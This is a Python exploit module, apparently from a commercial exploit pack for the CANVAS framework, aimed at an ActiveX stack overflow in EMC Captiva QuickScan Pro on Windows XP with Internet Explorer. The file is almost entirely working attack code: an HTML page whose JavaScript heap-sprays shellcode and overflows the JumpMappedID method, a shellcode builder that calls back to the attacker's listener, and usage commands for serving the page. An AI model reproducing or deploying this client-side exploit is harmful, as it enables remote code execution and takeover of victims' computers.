#! /usr/bin/env python

#
# Proprietary D2 Exploitation Pack source code - use only under the license 
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2009
#


import sys

if '.' not in sys.path: 
	sys.path.append('.')

from exploitutils import *
from tcpexploit import *
from httpclientside import httpclientside

import struct


# GUI info
NAME = "EMC Captiva QuickScan Pro KeyHelp ActiveX Stack Overflow Vulnerability"

DESCRIPTION = "Stack Overflow Vulnerability in EMC Captiva QuickScan Pro KeyHelp ActiveX"
DOCUMENTATION = {}
DOCUMENTATION["VENDOR"] = "EMC"
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION["Date public"] = "2009.09.30"
DOCUMENTATION["References"] = "http://secunia.com/advisories/36914/"
DOCUMENTATION["Versions Affected"] = "EMC Captiva QuickScan Pro 4.x"
DOCUMENTATION["CERT Advisory"] = ""
DOCUMENTATION["CVE Name"] = "Unknown"
DOCUMENTATION["CVE Url"] = "Unknown"
DOCUMENTATION["Notes"] = ""

VERSION='1.0'

GTK2_DIALOG='dialog.glade2'

PROPERTY={}
PROPERTY['TYPE'] = 'Exploit'
PROPERTY['SITE'] = 'Clientside'
PROPERTY['ARCH'] = [['Windows']]
PROPERTY['VERSION'] = ['XP']

NOTES="""
Usage:
.\commandlineInterface.py -p 5555 -v 1
.\exploits\httpserver\httpserver.py -v 9 -O singleexploit:d2sec_emckeyhelp -l 192.168.133.1 -d 5555 -p 80
"""

CHANGELOG="""
"""

targets = {    
    0:['Windows XP with IE'],
}

class theexploit(tcpexploit,httpclientside):
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)
        self.clientversion = 1
        self.badstring = "\x00"
        self.subesp = 0
        self.name = NAME 
        self.filename = "index.html"
        return
        
    def makefile(self):
        filedata = """
<HTML> 
<BODY>
 
<DIV id="targetDiv">

</DIV>

<SCRIPT language="javascript">  

try {		
	var detect = new ActiveXObject("KeyHelp.KeyCtrl.1");
	
	if (detect) {	
		document.getElementById("targetDiv").innerHTML = "<object classid='clsid:B7ECFD41-BE62-11D2-B9A8-00104B138C8C' id='target'></object>";	
			
		var stackBuffer = "";
		var heapSprayToAddress = 0x0c0c0c0c; 
		var payLoadCode = unescape('SHELLCODE'); 
		var heapBlockSize = 0x400000; 
		var payLoadSize = payLoadCode.length * 2; 
		var spraySlideSize = heapBlockSize - (payLoadSize+0x38); 
		var spraySlide = unescape("%u0c0c%u0c0c"); 
		spraySlide = getSpraySlide(spraySlide,spraySlideSize); 
		heapBlocks = (heapSprayToAddress - 0x400000)/heapBlockSize; 
		memory = new Array(); 
		
		for (i=0;i<heapBlocks;i++) { 
			memory[i] = spraySlide + payLoadCode; 
		} 
		
		function getSpraySlide(spraySlide, spraySlideSize) {
			while (spraySlide.length*2<spraySlideSize) { 
				spraySlide += spraySlide; 
			} 
			
			spraySlide = spraySlide.substring(0,spraySlideSize/2); 
			return spraySlide; 
		} 
		
		for (i=0;i<5000;i++) {
			stackBuffer += unescape("%u000c"); 
		}

		target.JumpMappedID(1, stackBuffer, "D2");
	}
}
catch(e) {}

</SCRIPT> 

</BODY> 
</HTML>        
""".replace('SHELLCODE', urluencode('AAAAAA' + self.shellcode))        
        return filedata

    def makesploit(self, clientheader, clientbody):        
        from libs.spkproxy import header, body
        h = header('SERVER')
        b = body()
        
        if clientheader.URL.count(self.filename):
            self.createShellcode()
            sploitstring = self.makefile()            
            b.setBody(sploitstring)
        else:
            self.log('Redirecting to self')
            h.status = '302'
            h.addHeader('Location', self.filename)
            h.addHeader('Content-Type', 'binary/octet-stream')
        return h, b

    def neededListenerTypes(self):
        from canvasengine import HTTPMOSDEF
        return [HTTPMOSDEF]
    
    def createShellcode(self):
        proxy_payload = ''
        try:
            if hasattr(self, 'HTTPMOSDEF') and self.HTTPMOSDEF == True:
                # make sure that fromcreatethread is set to 0 in your
                # httpserver/exploit listenerArgsDict!
                import shellcode.standalone.windows.payloads as payloads
                ssl_dict = { True : 'https', False : 'http' }
                print "XXX: self.useSSL ..." + str(self.useSSL)
                p   = payloads.payloads()
                sc  = p.http_proxy("%s://%s" %  (ssl_dict[self.useSSL], self.callback.ip), self.callback.port)
                proxy_payload = p.assemble(sc)
        except Exception,msg:
            import traceback
            traceback.print_exc(file=sys.stderr)
            proxy_payload = ''

        self.shellcode = self.createInjectToSelf(self.callback.ip, self.callback.port, proxy_payload)
        return self.shellcode

    def run(self):        
        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
